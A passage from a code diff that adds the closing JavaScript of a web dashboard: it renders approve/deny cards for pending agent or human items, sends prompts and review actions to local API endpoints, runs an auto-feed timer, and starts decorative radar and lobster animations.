+        return `<div class="pending-card" style="animation-delay:${i*0.05}s">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">
+            <span class="badge" style="background:${tc}18;color:${tc}">${(item.type||'').toUpperCase()}</span>
+            <span style="font-size:12px;color:#8a96a6">${item.source_type==='internal'?'Agent Output':'Human Input'}</span>
+          </div>
+          <div style="font-size:14px;color:#2a3a4a;font-family:${T.mono};margin-bottom:6px">${escHtml(item.label)}</div>
+          <div style="font-size:13px;color:#5a6a7a;margin-bottom:12px">${escHtml(item.source)}</div>
+          <div style="display:flex;gap:8px">
+            <button onclick="reviewAction('${item.id}','approve')" style="flex:1;background:#2a9d5c;border:none;color:#fff;border-radius:7px;padding:7px 0;font-size:13px;font-weight:600">Approve</button>
+            <button onclick="reviewAction('${item.id}','deny')" style="flex:1;background:transparent;border:1px solid ${T.blocked}44;color:${T.blocked};border-radius:7px;padding:7px 0;font-size:13px;font-weight:600">Deny</button>
+          </div>
+        </div>`;
+      }).join('')}
+    </div>
+  `;
+}
+
+function reviewAction(id, action){
+  fetch('/api/review/' + id, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({action})
+  });
+}
+
+// ─── Actions ───
+function manualFeed(type){
+  socket.emit('manual_feed', {type});
+}
+
+function sendPrompt(){
+  const input = document.getElementById('promptInput');
+  const cmd = input.value.trim();
+  if(!cmd) return;
+  input.value = '';
+  document.getElementById('sendBtn').style.opacity = '.4';
+  fetch('/api/prompt', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({command:cmd})
+  });
+}
+
+// ─── Auto Feed ───
+function startAutoFeed(){
+  if(autoFeedTimer) clearInterval(autoFeedTimer);
+  autoFeedTimer = setInterval(()=>{
+    if(autoFeed) socket.emit('auto_feed_tick', {});
+  }, 2500);
+}
+
+// ─── Init ───
+window.addEventListener('resize', ()=>{ computeSize(); });
+
+document.getElementById('promptInput').addEventListener('input', function(){
+  document.getElementById('sendBtn').style.opacity = this.value.trim() ? '1' : '.4';
+});
+document.getElementById('promptInput').addEventListener('keydown', function(e){
+  if(e.key==='Enter' && !e.shiftKey){ e.preventDefault(); sendPrompt(); }
+});
+document.getElementById('autoFeedToggle').addEventListener('change', function(){
+  autoFeed = this.checked;
+});
+
+// Boot
+computeSize();
+renderFeedButtons();
+renderStats();
+renderEvents();
+renderSourceGroups();
+drawRadar();
+animateLobster();
+pickLobsterTarget();
+setInterval(pickLobsterTarget, 2500+Math.random()*2000);
+startAutoFeed();
+</script>
+</body>
+</html>
